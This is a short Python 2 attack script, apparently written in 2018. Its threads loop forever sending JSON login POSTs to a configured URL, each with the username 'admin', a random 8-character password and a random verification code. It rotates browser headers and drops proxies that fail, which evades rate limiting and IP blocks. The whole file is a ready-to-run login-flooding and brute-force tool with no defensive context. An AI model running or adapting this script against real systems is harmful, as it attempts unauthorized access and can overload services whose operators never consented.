#!/usr/bin/env python
#_*_ coding:utf-8 _*_
'''
Created on 2018年1月7日13:17:12
@author: Redheat
@Email: qjyyn@qq.com
'''
import urllib2,random,string,json,threading,sys
def get_config(conf="conf/conf.json"):
    with open(conf) as json_file:
        data = json.load(json_file)
        return data
def get_header():
    header_list = config['browser_header']
    return random.choice(header_list)
def random_str(len=4):
    return ''.join(random.sample(string.ascii_lowercase + string.digits, len))
#代理
def install_proxy():
    if config['proxy_enable']:
        proxy_list = list(set(config['proxy'])^set(del_proxy))#剔除不可用的代理
    else:
        proxy_list = []
    if len(proxy_list) != 0:
        proxy = random.choice(proxy_list)
        proxies = {"http": proxy}  # 设置你想要使用的代理
    else:
        proxy = None
        proxies={}
        # sys.exit("have no proxy")
    proxy_s = urllib2.ProxyHandler(proxies)
    opener = urllib2.build_opener(proxy_s)
    proxy_info = [opener,proxy]
    return proxy_info
#post 请求
def post_req(uri,data):
    header_dict = get_header() #获取header
    req = urllib2.Request(url=uri, data=data, headers=header_dict)
    # 装载代理
    proxy_info = install_proxy()
    urllib2.install_opener(proxy_info[0])
    #发送请求
    try:
        res = urllib2.urlopen(req)
        response = res.read()
        print response
    except Exception,e:
        # print e
        if proxy_info[1] is not None:
            # print "del proxy %s" % proxy_info[1]
            del_proxy.append(proxy_info[1])
    else:
        print "use %s proxy success" % proxy_info[1]

config = get_config()
del_proxy = []
#主函数
def main_func():
    ip = config['url']
    post_data = config['post_data']
    while True:
        post_data["UserName"] = "admin"
        post_data["Password"] = random_str(8)
        post_data["Verify"] = random_str()
        textmod = json.dumps(post_data)
        # print textmod
        post_req(ip,textmod)

threads_num = config['threads']
threads_list = []
#多线程
for i in range(threads_num):
    t = threading.Thread(target=main_func)
    t.setDaemon(False)
    t.start()
